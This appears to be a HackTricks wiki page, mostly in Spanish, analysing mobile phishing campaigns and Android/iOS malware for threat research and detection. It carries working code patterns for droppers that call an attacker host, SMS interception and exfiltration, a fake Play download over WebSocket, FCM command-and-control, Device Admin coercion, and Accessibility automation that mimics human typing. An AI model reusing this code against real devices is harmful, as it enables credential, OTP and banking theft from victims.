# Phishing móvil y distribución de apps maliciosas (Android e iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página cubre técnicas usadas por actores de amenazas para distribuir **Android APKs maliciosos** y **mobile-configuration profiles** de iOS mediante phishing (SEO, ingeniería social, tiendas falsas, apps de citas, etc.).
> El material está adaptado de la campaña SarangTrap expuesta por Zimperium zLabs (2025) y otras investigaciones públicas.

## Flujo del ataque

1. **SEO/Phishing Infrastructure**
* Registrar docenas de dominios similares (dating, cloud share, car service…).
– Usar palabras clave en el idioma local y emojis en el elemento `<title>` para posicionar en Google.
– Hospedar *ambas* instrucciones de instalación para Android (`.apk`) y iOS en la misma landing page.
2. **First Stage Download**
* Android: enlace directo a un APK *unsigned* o de “tercera tienda”.
* iOS: `itms-services://` o enlace HTTPS plano a un **mobileconfig** malicioso (ver más abajo).
3. **Post-install Social Engineering**
* En la primera ejecución la app pide un **código de invitación / verificación** (ilusión de acceso exclusivo).
* El código se **POSTea por HTTP** al Command-and-Control (C2).
* El C2 responde `{"success":true}` ➜ el malware continúa.
* Análisis dinámico en sandbox / AV que nunca envía un código válido no ve **comportamiento malicioso** (evasión).
4. **Runtime Permission Abuse** (Android)
* Los permisos peligrosos sólo se piden **después de una respuesta positiva del C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Variantes recientes **eliminan `<uses-permission>` para SMS del `AndroidManifest.xml`** pero mantienen la ruta de código Java/Kotlin que lee SMS vía reflection ⇒ baja la puntuación estática mientras sigue funcionando en dispositivos que otorgan el permiso vía abuso de `AppOps` o objetivos antiguos.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 introdujo **Restricted settings** para apps sideloaded: los toggles de Accessibility y Notification Listener aparecen en gris hasta que el usuario permite explícitamente restricted settings en **App info**.
* Páginas de phishing y droppers ahora incluyen instrucciones UI paso a paso para **permitir restricted settings** para la app sideloaded y luego habilitar Accessibility/Notification access.
* Un bypass más nuevo es instalar la payload vía un **session‑based PackageInstaller flow** (el mismo método que usan las app stores). Android trata la app como instalada desde una store, así que Restricted settings ya no bloquea Accessibility.
* Pista de triage: en un dropper, buscar con grep `PackageInstaller.createSession/openSession` junto con código que inmediatamente navega a la víctima a `ACTION_ACCESSIBILITY_SETTINGS` o `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* La app muestra vistas inofensivas (visor de SMS, selector de galería) implementadas localmente.
* Mientras tanto exfiltra:
- IMEI / IMSI, número de teléfono
- Volcado completo de `ContactsContract` (array JSON)
- JPEG/PNG desde `/sdcard/DCIM` comprimidos con [Luban](https://github.com/Curzibn/Luban) para reducir tamaño
- SMS opcional (`content://sms`)
Las payloads se **comprimen en lotes (zip)** y se envían vía `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* Un único **mobile-configuration profile** puede solicitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc. para inscribir el dispositivo en una supervisión estilo “MDM”.
* Instrucciones de ingeniería social:
1. Abrir Settings ➜ *Profile downloaded*.
2. Tocar *Install* tres veces (capturas en la página de phishing).
3. Confiar en el profile sin firmar ➜ el atacante obtiene los permisos de *Contacts* y *Photo* sin revisión de App Store.
8. **iOS Web Clip Payload (phishing app icon)**
* Los payloads `com.apple.webClip.managed` pueden **anclar una URL de phishing en la pantalla de inicio** con un icono/etiqueta de marca.
* Los Web Clips pueden ejecutarse **a pantalla completa** (ocultan la UI del navegador) y marcarse como **no removibles**, forzando a la víctima a eliminar el profile para quitar el icono.
9. **Network Layer**
* HTTP plano, a menudo en el puerto 80 con HOST header como `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sin TLS → fácil de detectar).

## Consejos Red-Team

* **Dynamic Analysis Bypass** – Durante la evaluación del malware, automatizar la fase del código de invitación con Frida/Objection para alcanzar la rama maliciosa.
* **Manifest vs. Runtime Diff** – Comparar `aapt dump permissions` con el runtime `PackageManager#getRequestedPermissions()`; permisos peligrosos ausentes son una bandera roja.
* **Network Canary** – Configurar `iptables -p tcp --dport 80 -j NFQUEUE` para detectar ráfagas de POST sospechosas después de la entrada del código.
* **mobileconfig Inspection** – Usar `security cms -D -i profile.mobileconfig` en macOS para listar `PayloadContent` y detectar entitlements excesivos.

## Snippet útil de Frida: Auto-bypass del código de invitación

<details>
<summary>Frida: bypass automático del código de invitación</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indicadores (Genéricos)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video lure → la descripción contiene un enlace corto
- Enlace corto → sitio de phishing en GitHub Pages que imita el portal legítimo
- El mismo repo de GitHub aloja un APK con una insignia falsa de “Google Play” que enlaza directamente al archivo
- Páginas de phishing dinámicas alojadas en Replit; el canal de comandos remoto usa Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- El primer APK es un installer (dropper) que incluye el malware real en `assets/app.apk` y pide al usuario desactivar Wi‑Fi/mobile data para mitigar la detección en la nube.
- El embedded payload se instala bajo una etiqueta inocua (p. ej., “Secure Update”). Tras la instalación, tanto el installer como el payload aparecen como apps separadas.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Descubrimiento dinámico de endpoints vía shortlink
- Malware obtiene una lista en texto plano, separada por comas, de endpoints activos desde un shortlink; simples transformaciones de string producen la ruta final de la página de phishing.

Ejemplo (sanitizado):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudocódigo:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Captura de credenciales UPI basada en WebView
- El paso “Make payment of ₹1 / UPI‑Lite” carga un formulario HTML del atacante desde el endpoint dinámico dentro de un WebView y captura campos sensibles (teléfono, banco, UPI PIN) que se envían mediante `POST` a `addup.php`.

Cargador mínimo:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Se solicitan permisos agresivos en la primera ejecución:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Los contactos se iteran para enviar masivamente SMS de smishing desde el dispositivo de la víctima.
- Los SMS entrantes son interceptados por un broadcast receiver y se suben con metadatos (sender, body, SIM slot, per-device random ID) a `/addsm.php`.

Esquema del receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) como C2 resiliente
- La payload se registra en FCM; los mensajes push llevan un campo `_type` que se usa como interruptor para desencadenar acciones (p. ej., actualizar plantillas de texto de phishing, alternar comportamientos).

Ejemplo de payload de FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Esquema del handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicadores/IOCs
- APK contiene un payload secundario en `assets/app.apk`
- WebView carga el pago desde `gate.htm` y exfiltra a `/addup.php`
- Exfiltración de SMS a `/addsm.php`
- Recuperación de config impulsada por shortlink (p. ej., `rebrand.ly/*`) que devuelve endpoints en CSV
- Apps etiquetadas como genéricas “Update/Secure Update”
- Mensajes FCM `data` con un discriminador `_type` en apps no confiables

---

## Socket.IO/WebSocket-based APK Smuggling + Páginas falsas de Google Play

Los atacantes reemplazan cada vez más los enlaces APK estáticos por un canal Socket.IO/WebSocket incrustado en cebos con apariencia de Google Play. Esto oculta la URL del payload, elude los filtros de URL/extensión y conserva una experiencia de instalación realista (UX).

Flujo típico del cliente observado en la naturaleza:

<details>
<summary>Socket.IO descargador falso de Play (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Por qué evade controles simples:
- No se expone una URL estática del APK; la payload se reconstruye en memoria a partir de frames de WebSocket.
- Los filtros de URL/MIME/extensión que bloquean respuestas .apk directas pueden no detectar datos binarios tunelizados vía WebSockets/Socket.IO.
- Crawlers y sandboxes de URL que no ejecutan WebSockets no recuperarán la payload.

Vea también WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn caso de estudio

La campaña RatOn banker/RAT (ThreatFabric) es un ejemplo concreto de cómo las operaciones modernas de phishing móvil mezclan WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover e incluso NFC-relay orchestration. Esta sección abstrae las técnicas reutilizables.

### Etapa-1: WebView → native install bridge (dropper)
Los atacantes presentan un WebView que apunta a una página controlada por el atacante e inyectan una interfaz JavaScript que expone un instalador nativo. Un toque en un botón HTML llama a código nativo que instala un APK de segunda etapa incluido en los assets del dropper y luego lo lanza directamente.

Patrón mínimo:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML en la página:
```html
<button onclick="bridge.installApk()">Install</button>
```
Después de la instalación, el dropper inicia el payload mediante package/activity explícito:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Idea de hunting: aplicaciones no confiables que llaman a `addJavascriptInterface()` y exponen métodos tipo instalador a WebView; APK que incluye una carga útil secundaria incrustada bajo `assets/` e invoca la Package Installer Session API.

### Embudo de consentimiento: Accessibility + Device Admin + avisos de tiempo de ejecución posteriores
La etapa 2 abre un WebView que aloja una página “Access”. Su botón invoca un método exportado que navega a la víctima a los ajustes de Accessibility y solicita habilitar el servicio malicioso. Una vez concedido, el malware utiliza Accessibility para hacer clic automáticamente en los diálogos de permisos de tiempo de ejecución posteriores (contacts, overlay, manage system settings, etc.) y solicita Device Admin.

- Accessibility ayuda programáticamente a aceptar los avisos posteriores encontrando botones como “Allow”/“OK” en el árbol de nodos y despachando clics.
- Comprobación/solicitud del permiso overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Ver también:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom vía WebView
Los operadores pueden emitir comandos para:
- renderizar una superposición a pantalla completa desde una URL, o
- pasar HTML inline que se carga en una superposición WebView.

Usos probables: coerción (entrada de PIN), apertura de wallet para capturar PINs, mensajes de ransom. Mantener un comando para asegurar que se conceda el permiso de overlay si falta.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: volcar periódicamente el árbol de nodos de Accessibility, serializar los textos/roles/bounds visibles y enviarlos al C2 como una pseudo-pantalla (comandos como `txt_screen` una vez y `screen_live` continuo).
- High-fidelity: solicitar MediaProjection y comenzar a screen-casting/grabar bajo demanda (comandos como `display` / `record`).

### ATS playbook (bank app automation)
Dada una tarea JSON, abrir la app bancaria, controlar la UI vía Accessibility con una mezcla de consultas por texto y toques por coordenadas, e ingresar el PIN de pago de la víctima cuando se solicite.

Ejemplo de tarea:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Nuevo pago"
- "Zadat platbu" → "Ingresar pago"
- "Nový příjemce" → "Nuevo destinatario"
- "Domácí číslo účtu" → "Número de cuenta nacional"
- "Další" → "Siguiente"
- "Odeslat" → "Enviar"
- "Ano, pokračovat" → "Sí, continuar"
- "Zaplatit" → "Pagar"
- "Hotovo" → "Hecho"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Seguridad/Recuperación, reveal/show frase semilla, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Bloqueo inmediato:
```java
dpm.lockNow();
```
- Hacer expirar la credencial actual para forzar el cambio (Accessibility captura el nuevo PIN/contraseña):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forzar el desbloqueo no biométrico deshabilitando las funciones biométricas del keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Nota: Muchos controles de DevicePolicyManager requieren Device Owner/Profile Owner en versiones recientes de Android; algunas compilaciones OEM pueden ser laxas. Valida siempre en el OS/OEM objetivo.

### NFC relay orchestration (NFSkate)
Stage-3 puede instalar y lanzar un módulo externo de retransmisión NFC (p. ej., NFSkate) e incluso proporcionarle una plantilla HTML para guiar a la víctima durante la retransmisión. Esto permite cash-out card-present sin contacto junto con ATS en línea.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/estado: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Superposiciones: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Los actores de amenaza combinan cada vez más la automatización basada en Accessibility con anti-detección ajustada contra biometría de comportamiento básica. Un banker/RAT reciente muestra dos modos complementarios de entrega de texto y un conmutador para el operador que simula la escritura humana con cadencia aleatoria.

- Modo de descubrimiento: enumerar nodos visibles con selectores y bounds para apuntar con precisión a los inputs (ID, text, contentDescription, hint, bounds) antes de actuar.
- Inyección dual de texto:
- Modo 1 – `ACTION_SET_TEXT` directamente en el nodo objetivo (estable, sin teclado);
- Modo 2 – establecer clipboard + `ACTION_PASTE` en el nodo con foco (funciona cuando el setText directo está bloqueado).
- Cadencia similar a la humana: dividir la cadena proporcionada por el operador y entregarla carácter a carácter con retrasos aleatorios de 300–3000 ms entre eventos para evadir heurísticas de “machine-speed typing”. Implementado ya sea aumentando progresivamente el valor vía `ACTION_SET_TEXT`, o pegando un carácter a la vez.

<details>
<summary>Ejemplo Java: descubrimiento de nodos + entrada retardada por carácter vía setText o clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Bloqueo de overlays para encubrir fraude:
- Renderiza un `TYPE_ACCESSIBILITY_OVERLAY` de pantalla completa con opacidad controlada por el operador; mantenlo opaco para la víctima mientras la automatización remota se ejecuta por debajo.
- Comandos típicamente expuestos: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Overlay mínimo con alfa ajustable:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Primitivas de control de operador comúnmente observadas: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (compartición de pantalla).

## Referencias

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
